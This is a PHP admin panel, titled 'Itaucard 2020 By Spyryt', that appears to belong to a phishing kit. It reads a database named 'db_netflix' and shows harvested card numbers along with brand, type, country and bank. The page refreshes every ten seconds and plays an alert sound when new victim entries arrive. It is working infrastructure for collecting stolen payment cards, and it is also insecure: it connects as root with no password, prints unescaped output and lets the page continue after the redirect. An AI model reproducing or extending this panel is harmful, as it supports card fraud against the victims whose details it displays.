<?php
ini_set("display_errors", 0);
error_reporting(0);
session_start();
	if(!isset($_SESSION["ulog"]) || !isset($_SESSION["plog"])){
		header("Location: logout.php");
	}
	else{
		$file_clicks="files/clicks.txt";
		$fopen_clicks=fopen($file_clicks, "r");
		$clicks=fread($fopen_clicks, filesize($file_clicks));
		$file_parameters="files/parameters.txt";
		$fopen_parameters=fopen($file_parameters, "r");
		$explode=fread($fopen_parameters, filesize($file_parameters));
		$parameters=explode("|", $explode);
		$clean_buffer=ob_clean();
		$start_buffer=ob_start();
		$buffer=ob_get_flush();
		$verifica_buffer=file_get_contents("files/alert.txt");
		if($buffer !== $verifica_buffer){	
			file_put_contents("files/alert.txt", $buffer);
			$sound="<audio autoplay=$parameters[0]autoplay$parameters[0]><source src=$parameters[0]files/alert.mp3$parameters[0] type=$parameters[0]audio/mp3$parameters[0]></audio>\n</body>\n";
		}
		else{
			$sound="</body>\n";
		}
	}
$db_servername = "localhost";
$db_username = "root";
$db_password = "";
$db_name = "db_netflix";
$conn = new mysqli($db_servername, $db_username, $db_password, $db_name);

if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
$query = "SELECT * FROM tbl_access_info";
$results = $conn->query($query);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
	<meta http-equiv="refresh" content=10;>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<script language="javascript">
function ExecLogout(){
	location.href="logout.php";
}
</script>
<style>
    a.visited{
        color:#205081;
    }
</style>
    <!-- Title Page-->
    <title>Painel - Itaucard 2020 By Spyryt</title>

    <!-- Fontfaces CSS-->
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    <link href="vendor/bootstrap-progressbar/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet" media="all">
    <link href="vendor/wow/animate.css" rel="stylesheet" media="all">
    <link href="vendor/css-hamburgers/hamburgers.min.css" rel="stylesheet" media="all">
    <link href="vendor/slick/slick.css" rel="stylesheet" media="all">
    <link href="vendor/select2/select2.min.css" rel="stylesheet" media="all">
    <link href="vendor/perfect-scrollbar/perfect-scrollbar.css" rel="stylesheet" media="all">

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="animsition">
    <div class="page-wrapper">
        <!-- HEADER MOBILE-->
        <header class="header-mobile d-block d-lg-none">
            <div class="header-mobile__bar">
                <div class="container-fluid">
                    <div class="header-mobile-inner">
                        <a class="logo" href="index.html">
                            <img src="images/icon/logo.png" alt="CoolAdmin" />
                        </a>
                        <button class="hamburger hamburger--slider" type="button">
                            <span class="hamburger-box">
                                <span class="hamburger-inner"></span>
                            </span>
                        </button>
                    </div>
                </div>
            </div>
            <nav class="navbar-mobile">
                <div class="container-fluid">
                    <ul class="navbar-mobile__list list-unstyled">
                        <li class="has-sub">
                            <a class="js-arrow" href="#">
                                <i class="fas fa-tachometer-alt"></i>Dashboard</a>
                            <ul class="navbar-mobile-sub__list list-unstyled js-sub-list">
                                <li>
                                    <a href="index.html">Dashboard 1</a>
                                </li>
                                <li>
                                    <a href="index2.html">Dashboard 2</a>
                                </li>
                                <li>
                                    <a href="index3.html">Dashboard 3</a>
                                </li>
                                <li>
                                    <a href="index4.html">Dashboard 4</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="chart.html">
                                <i class="fas fa-chart-bar"></i>Charts</a>
                        </li>
                        <li>
                            <a href="table.html">
                                <i class="fas fa-table"></i>Tables</a>
                        </li>
                        <li>
                            <a href="form.html">
                                <i class="far fa-check-square"></i>Forms</a>
                        </li>
                        <li>
                            <a href="calendar.html">
                                <i class="fas fa-calendar-alt"></i>Calendar</a>
                        </li>
                        <li>
                            <a href="map.html">
                                <i class="fas fa-map-marker-alt"></i>Maps</a>
                        </li>
                        <li class="has-sub">
                            <a class="js-arrow" href="#">
                                <i class="fas fa-copy"></i>Pages</a>
                            <ul class="navbar-mobile-sub__list list-unstyled js-sub-list">
                                <li>
                                    <a href="login.html">Login</a>
                                </li>
                                <li>
                                    <a href="register.html">Register</a>
                                </li>
                                <li>
                                    <a href="forget-pass.html">Forget Password</a>
                                </li>
                            </ul>
                        </li>
                        <li class="has-sub">
                            <a class="js-arrow" href="#">
                                <i class="fas fa-desktop"></i>UI Elements</a>
                            <ul class="navbar-mobile-sub__list list-unstyled js-sub-list">
                                <li>
                                    <a href="button.html">Button</a>
                                </li>
                                <li>
                                    <a href="badge.html">Badges</a>
                                </li>
                                <li>
                                    <a href="tab.html">Tabs</a>
                                </li>
                                <li>
                                    <a href="card.html">Cards</a>
                                </li>
                                <li>
                                    <a href="alert.html">Alerts</a>
                                </li>
                                <li>
                                    <a href="progress-bar.html">Progress Bars</a>
                                </li>
                                <li>
                                    <a href="modal.html">Modals</a>
                                </li>
                                <li>
                                    <a href="switch.html">Switchs</a>
                                </li>
                                <li>
                                    <a href="grid.html">Grids</a>
                                </li>
                                <li>
                                    <a href="fontawesome.html">Fontawesome Icon</a>
                                </li>
                                <li>
                                    <a href="typo.html">Typography</a>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- END HEADER MOBILE-->

        <!-- MENU SIDEBAR-->
        <aside class="menu-sidebar d-none d-lg-block">
            <div class="logo">
                <a href="#">
                    <img src="images/icon/logo.png" alt="Cool Admin" />
                </a>
            </div>
            <div class="menu-sidebar__content js-scrollbar1">
                <nav class="navbar-sidebar">
                    <ul class="list-unstyled navbar__list">
                        <li class="active has-sub">
                            <a class="js-arrow" href="#">
                                <i class="fas fa-tachometer-alt"></i>Inicio</a>
                            <ul class="list-unstyled navbar__sub-list js-sub-list">
                            </ul>
                        </li>
                    </ul>
                </nav>
            </div>
        </aside>
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
            <header class="header-desktop">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="header-wrap">
                            <div class="header-button">
                              <div class="noti-wrap">
                                    <div class="noti__item js-item-menu">
                                <i class="zmdi zmdi-comment-more"></i></div>
                                <div class="noti__item js-item-menu">
                                  <i class="zmdi zmdi-email"></i></div>
                                </div>
                                <div class="account-wrap">
                                    <div class="account-item clearfix js-item-menu">
                                        <div class="image">
                                            <img src="images/icon/avatar-01.jpg" alt="John Doe" />
                                        </div>
                                        <div class="content">
                                            <a class="js-acc-btn" href="#">Marcio</a>
                                        </div>
                                        <div class="account-dropdown js-dropdown">
                                            <div class="info clearfix">
                                                <div class="image">
                                                    <a href="#">
                                                        <img src="images/icon/avatar-01.jpg" alt="John Doe" />
                                                    </a>
                                                </div>
                                                <div class="content">
                                                    <h5 class="name">
                                                        <a href="#"><?php echo "Olá, ".$_SESSION["ulog"].""; ?></a>
                                                    </h5>
                                                    <span class="email">Spyryt@painel.com</span>
                                                </div>
                                            </div>
                                            <div class="account-dropdown__body"></div>
                                            <div class="account-dropdown__footer">
                                                <a href="#">
                                                    <i class="zmdi zmdi-power" onclick="ExecLogout();"></i>Deslogar</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
            <div class="main-content" style="padding-left: 200px;">
                
                
                <table class="table table-stripe">
                    <thead>
                        <th>Date</th>
                        <th>Number</th>
                        <th>Brand</th>
                        <th>Type</th>
                        <th>Category</th>
                        <th>Country</th>
                        <th>Bank</th>
                    </thead>
                    <tbody>
                        
                            <?php
                                
                                while($row = $results->fetch_array(MYSQLI_NUM)){
                            ?>
                            <tr>
                                <td><?php echo $row[18] ?></td>
                                <td>
                                    <?php
                                    if($row[19] == "false"){
                                    ?>
                                        <a href="txtView.php?id=<?php echo $row[0] ?>"><?php echo $row[8] ?></a>
                                    <?php
                                    }
                                    else if($row[19] == "true"){
                                    ?>
                                        <a href="txtView.php?id=<?php echo $row[0] ?>" style="color: #660099;"><?php echo $row[8] ?></a>
                                    <?php
                                    }
                                    ?>
                                </td>
                                <td><?php echo $row[12] ?></td>
                                <td><?php echo $row[13] ?></td>
                                <td><?php echo $row[14] ?></td>
                                <td><?php echo $row[15] ?></td>
                                <td><?php echo $row[16] ?></td>
                            </tr>
                            <?php
                            }

                            ?>
                        </tr>
                    </tbody>
                </table>
                
            </div>
            <!-- END MAIN CONTENT-->
            <!-- END PAGE CONTAINER-->
        </div>

    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>

    <!-- Main JS-->
    <script src="js/main.js"></script>
    <script>
    </script>
</body>

</html>
<!-- end document-->
